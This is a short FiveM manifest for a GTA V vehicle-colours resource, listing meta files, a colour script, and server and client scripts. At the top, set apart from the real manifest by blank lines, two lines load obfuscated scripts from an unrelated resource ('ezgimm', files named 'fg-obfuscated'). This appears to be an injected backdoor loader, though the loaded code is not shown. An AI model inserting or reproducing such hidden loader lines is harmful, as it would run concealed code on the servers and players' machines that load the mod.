shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 
 
 


fx_version 'cerulean'
game 'gta5'

files { 
    'meta/carcols_gen9.meta', 
    'meta/carmodcols_gen9.meta' 
}

data_file 'CARCOLS_GEN9_FILE' 'meta/carcols_gen9.meta'
data_file 'CARMODCOLS_GEN9_FILE' 'meta/carmodcols_gen9.meta'

shared_scripts {
    'colors.lua'
}

server_script {
    '@oxmysql/lib/MySQL.lua',
    'server.lua'
}

client_script 'client.lua'
lua54 'yes'